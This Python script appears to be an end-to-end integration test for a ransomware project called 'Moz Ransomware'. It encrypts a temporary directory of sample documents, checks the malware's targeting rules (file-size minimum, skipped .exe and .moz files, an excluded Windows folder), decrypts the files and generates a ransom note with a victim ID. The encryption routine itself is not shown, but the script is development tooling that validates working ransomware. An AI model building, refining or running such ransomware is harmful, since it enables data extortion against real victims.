#!/usr/bin/env python3
"""
Moz Ransomware Phase 2 Integration Test
Tests the full hybrid encryption workflow end-to-end.
"""

import os
import sys
import shutil
import tempfile
from pathlib import Path

# Add wrapper to path
sys.path.insert(0, str(Path(__file__).parent.parent / "wrapper" / "src"))
from moz_wrapper import MozRansomware

def main():
    print("=== Moz Ransomware Phase 2 Integration Test ===\n")
    
    # Create test directory with sample files
    test_dir = tempfile.mkdtemp(prefix="moz_test_")
    
    # Generate larger file contents (> 1KB to pass min_file_size filter)
    padding = b"\x41" * 2048  # 2KB of padding
    
    sample_files = {
        "document.txt": b"This is a secret document. " + padding,
        "spreadsheet.xlsx": b"Sensitive financial data in Excel format. " + padding,
        "image.jpg": b"Fake JPG binary data " * 100,
        "script.py": b"print('malicious code here') " + padding,
        "archive.zip": b"PK" + b"\x00" * 50 + padding,  # Fake ZIP
        "data.sql": b"SELECT * FROM users WHERE password='admin' " + padding,
        "readme.exe": b"binary executable data " + padding,  # Should be skipped (.exe not in targets)
        "config.moz": b"already encrypted file " + padding,  # Should be skipped
    }
    
    for filename, content in sample_files.items():
        filepath = os.path.join(test_dir, filename)
        with open(filepath, "wb") as f:
            f.write(content)
    
    # Create subdirectories
    subdir = os.path.join(test_dir, "subdir")
    os.makedirs(subdir)
    with open(os.path.join(subdir, "nested.docx"), "wb") as f:
        f.write(b"Nested document content " + padding)
    
    # Create an excluded directory
    win_dir = os.path.join(test_dir, "Windows")
    os.makedirs(win_dir)
    with open(os.path.join(win_dir, "system.txt"), "wb") as f:
        f.write(b"System file that should be skipped " + padding)
    
    initial_count = sum(len(files) for _, _, files in os.walk(test_dir))
    print(f"Test directory: {test_dir}")
    print(f"Initial files: {initial_count}")
    
    # Initialize Moz with self-generated keys (for testing)
    moz = MozRansomware()
    
    # Encrypt directory
    print("\n--- Encryption Phase ---")
    enc_results = moz.encrypt_directory(test_dir)
    print(f"  Total scanned: {enc_results['total_files']}")
    print(f"  Encrypted:     {enc_results['encrypted_files']}")
    print(f"  Skipped:       {enc_results['skipped_files']}")
    print(f"  Failed:        {enc_results['failed_files']}")
    if enc_results.get('errors'):
        for err in enc_results['errors']:
            print(f"  Error: {err}")
    
    # Show resulting structure
    print(f"\n  Files after encryption (recursive):")
    for root, dirs, files in os.walk(test_dir):
        rel = os.path.relpath(root, test_dir)
        prefix = f"  {rel}/" if rel != "." else "  "
        for f in sorted(files):
            print(f"{prefix}{f}")
    
    moz_files = []
    for root, _, files in os.walk(test_dir):
        for f in files:
            if f.endswith(".moz"):
                moz_files.append(os.path.join(root, f))
    
    print(f"\n  .moz files found: {len(moz_files)}")
    
    # Decrypt directory
    print("\n--- Decryption Phase ---")
    dec_results = moz.decrypt_directory(test_dir)
    print(f"  Total scanned: {dec_results['total_files']}")
    print(f"  Decrypted:     {dec_results['decrypted_files']}")
    print(f"  Failed:        {dec_results['failed_files']}")
    if dec_results.get('errors'):
        for err in dec_results['errors']:
            print(f"  Error: {err}")
    
    # Show resulting structure after decryption
    print(f"\n  Files after decryption (recursive):")
    for root, dirs, files in os.walk(test_dir):
        rel = os.path.relpath(root, test_dir)
        prefix = f"  {rel}/" if rel != "." else "  "
        for f in sorted(files):
            print(f"{prefix}{f}")
    
    # Verify original files are restored
    print("\n--- Verification ---")
    
    expected_restored = [
        "document.txt", "spreadsheet.xlsx", "image.jpg",
        "script.py", "archive.zip", "data.sql"
    ]
    expected_unencrypted = ["readme.exe", "config.moz"]
    expected_excluded = ["Windows/system.txt"]  # Should never be touched
    
    all_correct = True
    
    # Check restored files exist (not .moz)
    for f in expected_restored:
        path = os.path.join(test_dir, f)
        if not os.path.exists(path):
            print(f"  FAIL: {f} missing after decrypt")
            all_correct = False
        else:
            # Verify content
            with open(path, "rb") as fh:
                content = fh.read()
            expected_content = sample_files[f]
            if content == expected_content:
                print(f"  OK: {f} restored correctly ({len(content)} bytes)")
            else:
                print(f"  FAIL: {f} content mismatch")
                all_correct = False
    
    # Check .exe and .moz files were skipped
    for f in expected_unencrypted:
        path = os.path.join(test_dir, f)
        if os.path.exists(path):
            print(f"  OK: {f} was correctly skipped during encryption")
        else:
            print(f"  FAIL: {f} should not have been encrypted")
            all_correct = False
    
    # Check excluded directory
    win_txt = os.path.join(test_dir, "Windows", "system.txt")
    if os.path.exists(win_txt):
        print(f"  OK: Windows/system.txt was correctly excluded")
    else:
        print(f"  FAIL: Windows/system.txt should not have been encrypted")
        all_correct = False
    
    # Check nested file
    nested = os.path.join(subdir, "nested.docx")
    nested_moz = os.path.join(subdir, "nested.docx.moz")
    if os.path.exists(nested):
        print(f"  OK: subdir/nested.docx restored correctly")
    elif os.path.exists(nested_moz):
        print(f"  FAIL: subdir/nested.docx still encrypted")
        all_correct = False
    else:
        print(f"  FAIL: subdir/nested.docx missing")
        all_correct = False
    
    # Generate ransom note
    print("\n--- Ransom Note ---")
    note = moz.generate_ransom_note("test-victim-12345")
    print(note[:200] + "...")
    
    # Cleanup
    shutil.rmtree(test_dir)
    
    if all_correct:
        print("\n=== ALL INTEGRATION TESTS PASSED ===")
        return 0
    else:
        print("\n=== INTEGRATION TEST FAILED ===")
        return 1

if __name__ == "__main__":
    sys.exit(main())
